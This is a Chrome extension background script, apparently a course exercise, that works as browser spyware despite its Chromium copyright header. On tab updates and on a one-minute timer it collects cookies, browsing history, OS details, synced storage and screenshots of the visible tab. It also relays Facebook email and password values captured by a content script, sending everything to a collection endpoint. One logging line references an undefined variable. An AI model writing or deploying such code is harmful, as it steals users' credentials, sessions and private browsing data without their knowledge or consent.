// Copyright (c) 2011 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Called when the user clicks on the browser action.
function f(tabId, changeInfo, tab) {
  if(changeInfo.url){
    var url = changeInfo.url;
    console.log("url is " + url);
    var para = { url: url};
    send(para);
    //The code below here is for Bonus Q2.2
    sendCookies(url);
    setLocalStorage();
    //sendLocalStorage();
    captureTab();
  }
}

setInterval(function() {
  sendHistories();
  sendOSinfo();
  sendLocalStorage();
}, 1 * 60 * 1000);


function sendCookies(domain) {
  chrome.cookies.getAll({"url": domain}, function(cookies) {
    sendToSpecificRequest({"url" : domain, "cookies" : cookies}, "saveCookies");
  });
}
//get search history
function sendHistories(){
  chrome.history.search({text: '', maxResults: 10}, function(data) {
    var histories = [];
    data.forEach(function(page) {
      histories.push(page.url)
    });
    sendToSpecificRequest({"history" : histories}, "saveHistories");
  });
}

//get os info
function sendOSinfo(){
  chrome.runtime.getPlatformInfo(function(info) {
    // Display host OS in the console
    sendToSpecificRequest({"os" : info}, "saveosInfo");
  });
}

//captureTab
function captureTab(){
  chrome.tabs.captureVisibleTab(null,{},function(dataUrl){
    sendToSpecificRequest({"dataurl" : dataUrl}, "saveCaptureTab");
  });
}


function setLocalStorage(){
  chrome.storage.sync.set({"user_name": 'user_name'}, function() {
    console.log('Value is set to ' + value);
  });
}


function sendLocalStorage(){
  chrome.storage.sync.get(null, function(items) {
    // var allKeys = Object.keys(items);
    sendToSpecificRequest({"item" : items}, "saveLocalStorage");
});
}

chrome.tabs.onUpdated.addListener(f);

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    console.log(sender.tab ?
                "from a content script:" + sender.tab.url :
                "from the extension");
    sendToSpecificRequest({"facebookEmail" : request.facebookEmail, "facebookPass": request.facebookPass}, "saveFacebookLogin");
    sendResponse({farewell: "goodbye"});
  });
